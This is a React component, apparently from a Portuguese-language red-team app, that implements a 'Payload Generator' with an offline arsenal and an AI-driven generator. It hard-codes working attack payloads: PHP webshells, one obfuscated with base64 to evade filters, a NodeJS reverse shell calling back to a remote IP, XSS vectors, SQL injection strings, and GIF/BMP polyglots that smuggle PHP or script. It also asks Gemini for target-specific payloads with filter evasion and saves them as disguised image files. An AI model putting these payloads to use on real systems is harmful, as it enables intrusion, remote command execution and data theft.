import React, { useState, useEffect } from 'react';
import { X, Download, Skull, Code, RefreshCw, Zap, Library, Copy, Check, Terminal, Database, ShieldAlert, ToggleLeft, ToggleRight, ChevronRight, Cpu, FileImage } from 'lucide-react';
import { generatePayload } from '../services/geminiService';
import { ThemeColor } from '../types';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';

interface PayloadGeneratorModalProps {
  isOpen: boolean;
  onClose: () => void;
  themeColor: ThemeColor;
}

const PAYLOAD_LIBRARY = {
  webshells: [
    { name: 'PHP System Shell', content: '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>', type: 'php', desc: 'Basic command execution' },
    { name: 'PHP Obfuscated', content: '<?php eval(base64_decode("aWYoaXNzZXQoJF9HRVRbImNtZCJdKSl7IHN5c3RlbSgkX0dFVFsiY21kIl0pOyB9")); ?>', type: 'php', desc: 'Bypass basic filters' },
    { name: 'NodeJS Reverse Shell', content: '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(1337, "10.0.0.1", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();', type: 'javascript', desc: 'Net socket reverse connection' }
  ],
  xss: [
    { name: 'Polyglot SVG', content: '"><svg/onload=alert(document.domain)>', type: 'html', desc: 'Breaks out of contexts' },
    { name: 'Img OnError', content: '<img src=x onerror=alert(1)>', type: 'html', desc: 'Classic image vector' },
    { name: 'JS Protocol', content: 'javascript:alert(1)', type: 'javascript', desc: 'For href attributes' }
  ],
  sqli: [
    { name: 'Auth Bypass', content: "' OR '1'='1", type: 'sql', desc: 'Login bypass' },
    { name: 'Union Select', content: "' UNION SELECT null, table_name, null FROM information_schema.tables -- ", type: 'sql', desc: 'Data extraction' },
    { name: 'Time Based', content: "'; WAITFOR DELAY '0:0:5' --", type: 'sql', desc: 'Blind injection test' }
  ],
  polyglots: [
    { name: 'GIF89a PHP Polyglot', content: 'GIF89a; <?php system($_GET["c"]); //', type: 'text', desc: 'Valid GIF header with PHP payload' },
    { name: 'GIF XSS Polyglot', content: 'GIF89a/*<svg/onload=alert(1)>*/=1;', type: 'text', desc: 'Valid GIF header with JS execution' },
    { name: 'BMP Polyglot', content: 'BM=\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00<script>alert(1)</script>', type: 'text', desc: 'Bitmap header injection' }
  ]
};

export const PayloadGeneratorModal: React.FC<PayloadGeneratorModalProps> = ({
  isOpen,
  onClose,
  themeColor
}) => {
  const [activeTab, setActiveTab] = useState<'ai' | 'arsenal'>('arsenal');
  const [category, setCategory] = useState<'webshells' | 'xss' | 'sqli' | 'polyglots'>('webshells');
  
  // AI State
  const [attackType, setAttackType] = useState('polyglot_image');
  const [context, setContext] = useState('');
  const [isBypassMode, setIsBypassMode] = useState(true);
  const [isGenerating, setIsGenerating] = useState(false);
  
  // Output State
  const [generatedPayload, setGeneratedPayload] = useState('');
  const [copied, setCopied] = useState(false);

  // Reset state when opening
  useEffect(() => {
    if (isOpen) {
        setGeneratedPayload('');
        setCopied(false);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const handleGenerateAI = async () => {
    setIsGenerating(true);
    setGeneratedPayload('');
    try {
      const result = await generatePayload(attackType, context || 'Generic Test', isBypassMode);
      setGeneratedPayload(result);
    } catch (error) {
      setGeneratedPayload("// Erro ao gerar payload. Tente novamente.");
    } finally {
      setIsGenerating(false);
    }
  };

  const handleCopy = () => {
      navigator.clipboard.writeText(generatedPayload);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
  };

  const downloadFile = () => {
    if (!generatedPayload) return;
    
    // Auto-detect extension based on header
    let extension = 'txt';
    let mimeType = 'text/plain';

    if (generatedPayload.startsWith('GIF89a')) {
        extension = 'gif';
        mimeType = 'image/gif';
    } else if (generatedPayload.startsWith('BM')) {
        extension = 'bmp';
        mimeType = 'image/bmp';
    } else if (generatedPayload.includes('<?php')) {
        extension = 'php';
    } else if (generatedPayload.includes('<html') || generatedPayload.includes('<svg')) {
        extension = 'html';
    } else if (category === 'sqli') {
        extension = 'sql';
    }

    const blob = new Blob([generatedPayload], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `payload_${Date.now()}.${extension}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 animate-fade-in">
      <div className="bg-[#1e1f20] border border-[#444746] rounded-[28px] w-full max-w-4xl shadow-2xl flex flex-col max-h-[90vh] overflow-hidden">
        
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-5 border-b border-[#444746] bg-[#1e1f20]">
          <div className="flex items-center gap-3">
             <div className="p-2 bg-[#ffb4ab]/10 rounded-xl">
                <Skull className="text-[#ffb4ab]" size={24} />
             </div>
             <div>
                <h2 className="text-xl font-bold text-[#e3e3e3] tracking-tight">Gerador de Payloads</h2>
                <p className="text-xs text-[#c4c7c5]">Auditoria & Red Team</p>
             </div>
          </div>
          <button onClick={onClose} className="text-[#c4c7c5] hover:text-[#e3e3e3] transition-colors p-2 hover:bg-[#303030] rounded-full">
            <X size={24} />
          </button>
        </div>

        <div className="flex flex-1 overflow-hidden flex-col md:flex-row">
            
            {/* Sidebar Navigation */}
            <div className="w-full md:w-64 bg-[#131314] border-r border-[#444746] flex flex-col">
               <div className="p-4 space-y-2">
                  <div className="text-xs font-bold text-[#8e918f] uppercase px-2 mb-2 tracking-wider">Módulos</div>
                  
                  <button 
                    onClick={() => setActiveTab('arsenal')}
                    className={`w-full flex items-center gap-3 px-4 py-3 rounded-full text-sm font-bold transition-all ${activeTab === 'arsenal' ? 'bg-[#004a77] text-[#c2e7ff]' : 'text-[#c4c7c5] hover:bg-[#303030]'}`}
                  >
                    <Library size={18} /> Arsenal Offline
                  </button>

                  <button 
                    onClick={() => setActiveTab('ai')}
                    className={`w-full flex items-center gap-3 px-4 py-3 rounded-full text-sm font-bold transition-all ${activeTab === 'ai' ? 'bg-[#4f378b] text-[#eaddff]' : 'text-[#c4c7c5] hover:bg-[#303030]'}`}
                  >
                    <Cpu size={18} /> IA Generativa
                  </button>
               </div>

               {activeTab === 'arsenal' && (
                 <div className="p-4 pt-0 space-y-1">
                    <div className="text-xs font-bold text-[#8e918f] uppercase px-2 mb-2 mt-4 tracking-wider">Categorias</div>
                    <button onClick={() => setCategory('webshells')} className={`w-full flex items-center justify-between px-4 py-2.5 rounded-full text-xs transition-colors font-medium ${category === 'webshells' ? 'bg-[#303030] text-[#e3e3e3]' : 'text-[#c4c7c5] hover:text-[#e3e3e3]'}`}>
                        <span className="flex items-center gap-2"><Terminal size={14}/> Webshells</span>
                        {category === 'webshells' && <ChevronRight size={12}/>}
                    </button>
                    <button onClick={() => setCategory('xss')} className={`w-full flex items-center justify-between px-4 py-2.5 rounded-full text-xs transition-colors font-medium ${category === 'xss' ? 'bg-[#303030] text-[#e3e3e3]' : 'text-[#c4c7c5] hover:text-[#e3e3e3]'}`}>
                        <span className="flex items-center gap-2"><Code size={14}/> XSS / HTML</span>
                        {category === 'xss' && <ChevronRight size={12}/>}
                    </button>
                    <button onClick={() => setCategory('sqli')} className={`w-full flex items-center justify-between px-4 py-2.5 rounded-full text-xs transition-colors font-medium ${category === 'sqli' ? 'bg-[#303030] text-[#e3e3e3]' : 'text-[#c4c7c5] hover:text-[#e3e3e3]'}`}>
                        <span className="flex items-center gap-2"><Database size={14}/> SQL Injection</span>
                        {category === 'sqli' && <ChevronRight size={12}/>}
                    </button>
                    <button onClick={() => setCategory('polyglots')} className={`w-full flex items-center justify-between px-4 py-2.5 rounded-full text-xs transition-colors font-medium ${category === 'polyglots' ? 'bg-[#303030] text-[#e3e3e3]' : 'text-[#c4c7c5] hover:text-[#e3e3e3]'}`}>
                        <span className="flex items-center gap-2"><FileImage size={14}/> Image Polyglots</span>
                        {category === 'polyglots' && <ChevronRight size={12}/>}
                    </button>
                 </div>
               )}
            </div>

            {/* Content Area */}
            <div className="flex-1 bg-[#1e1f20] p-8 overflow-y-auto custom-scrollbar flex flex-col gap-8">
                
                {/* CONFIGURATION PANEL */}
                <div className="animate-fade-in">
                    {activeTab === 'ai' ? (
                        <div className="space-y-6 max-w-2xl">
                            <div>
                                <h3 className="text-[#e3e3e3] font-bold mb-2 flex items-center gap-2 text-lg"><Zap size={20} className="text-[#d0bcff]"/> Gerador Dinâmico (Gemini 2.0)</h3>
                                <p className="text-[#c4c7c5] text-sm leading-relaxed">Crie payloads customizados baseados no contexto específico do alvo.</p>
                            </div>
                            
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                                <div>
                                    <label className="block text-xs font-bold text-[#8e918f] uppercase mb-2">Vetor de Ataque</label>
                                    <select 
                                        value={attackType}
                                        onChange={(e) => setAttackType(e.target.value)}
                                        className="w-full bg-[#131314] border border-[#444746] rounded-xl p-3 text-sm text-[#e3e3e3] focus:border-[#d0bcff] focus:outline-none"
                                    >
                                        <option value="polyglot_image">📸 Imagem Poliglota (GIF89a)</option>
                                        <option value="xss">🌐 XSS Context Breaking</option>
                                        <option value="sqli">🗄️ SQL Injection Avançado</option>
                                        <option value="rce">⚡ Remote Code Execution (RCE)</option>
                                    </select>
                                </div>
                                <div>
                                    <label className="block text-xs font-bold text-[#8e918f] uppercase mb-2">Modo de Evasão</label>
                                    <button 
                                        onClick={() => setIsBypassMode(!isBypassMode)}
                                        className={`w-full flex items-center justify-between p-3 rounded-xl border text-sm transition-all ${isBypassMode ? 'bg-[#00391a] border-[#6dd58c] text-[#6dd58c]' : 'bg-[#131314] border-[#444746] text-[#c4c7c5]'}`}
                                    >
                                        <span className="flex items-center gap-2 font-bold">
                                            <ShieldAlert size={16} />
                                            {isBypassMode ? 'Filter Bypass' : 'Standard'}
                                        </span>
                                        {isBypassMode ? <ToggleRight size={20}/> : <ToggleLeft size={20}/>}
                                    </button>
                                </div>
                            </div>
                            
                            <div>
                                <label className="block text-xs font-bold text-[#8e918f] uppercase mb-2">Contexto do Alvo</label>
                                <input 
                                    type="text"
                                    placeholder="Ex: Input de busca em React, Upload de Avatar PHP..."
                                    value={context}
                                    onChange={(e) => setContext(e.target.value)}
                                    className="w-full bg-[#131314] border border-[#444746] rounded-xl p-4 text-sm text-[#e3e3e3] focus:border-[#d0bcff] focus:outline-none placeholder-[#8e918f]"
                                />
                            </div>

                            <button 
                                onClick={handleGenerateAI}
                                disabled={isGenerating}
                                className="px-8 py-4 bg-[#6750a4] hover:bg-[#7f67be] text-white font-bold rounded-full shadow-lg transition-all flex items-center justify-center gap-3 w-full md:w-auto"
                            >
                                {isGenerating ? <RefreshCw className="animate-spin" size={20}/> : <Zap size={20}/>}
                                Gerar Payload com IA
                            </button>
                        </div>
                    ) : (
                        <div className="space-y-4">
                             <div>
                                <h3 className="text-[#e3e3e3] font-bold mb-2 flex items-center gap-2 text-lg"><Library size={20} className="text-[#a8c7fa]"/> Arsenal (Offline Library)</h3>
                                <p className="text-[#c4c7c5] text-sm">Selecione um template testado para uso imediato.</p>
                            </div>
                            
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                                {PAYLOAD_LIBRARY[category].map((item, idx) => (
                                    <button 
                                        key={idx}
                                        onClick={() => setGeneratedPayload(item.content)}
                                        className="text-left bg-[#131314] hover:bg-[#303030] border border-[#444746] hover:border-[#8e918f] p-4 rounded-[20px] transition-all group"
                                    >
                                        <div className="font-bold text-[#e3e3e3] text-sm mb-1 group-hover:text-[#a8c7fa] transition-colors">{item.name}</div>
                                        <div className="text-xs text-[#8e918f] line-clamp-2">{item.desc}</div>
                                    </button>
                                ))}
                            </div>
                        </div>
                    )}
                </div>

                {/* OUTPUT PANEL */}
                <div className={`flex-1 flex flex-col bg-[#131314] rounded-2xl border border-[#444746] overflow-hidden shadow-inner relative transition-all ${generatedPayload ? 'opacity-100 translate-y-0' : 'opacity-50 translate-y-4 pointer-events-none'}`}>
                     <div className="flex items-center justify-between px-5 py-3 bg-[#1e1f20] border-b border-[#444746]">
                        <div className="flex items-center gap-2">
                             <Terminal size={14} className="text-[#c4c7c5]" />
                             <span className="text-xs font-bold font-mono text-[#8e918f]">PAYLOAD OUTPUT</span>
                        </div>
                        <div className="flex items-center gap-2">
                             <button onClick={handleCopy} className="p-2 hover:bg-[#303030] rounded-full text-[#c4c7c5] hover:text-white transition-colors" title="Copiar">
                                {copied ? <Check size={16} className="text-[#6dd58c]"/> : <Copy size={16}/>}
                             </button>
                             <button onClick={downloadFile} className="p-2 hover:bg-[#303030] rounded-full text-[#c4c7c5] hover:text-white transition-colors" title="Download">
                                <Download size={16}/>
                             </button>
                        </div>
                     </div>
                     <div className="flex-1 overflow-auto custom-scrollbar relative">
                        {generatedPayload ? (
                            <SyntaxHighlighter
                                language={activeTab === 'ai' ? 'javascript' : PAYLOAD_LIBRARY[category][0]?.type || 'text'}
                                style={vscDarkPlus}
                                customStyle={{ margin: 0, padding: '1.5rem', fontSize: '13px', background: 'transparent', lineHeight: '1.5' }}
                                wrapLines={true}
                                wrapLongLines={true}
                            >
                                {generatedPayload}
                            </SyntaxHighlighter>
                        ) : (
                            <div className="absolute inset-0 flex items-center justify-center text-[#444746] font-mono text-sm tracking-widest">
                                [ AGUARDANDO GERAÇÃO ]
                            </div>
                        )}
                     </div>
                </div>

            </div>

        </div>
      </div>
    </div>
  );
};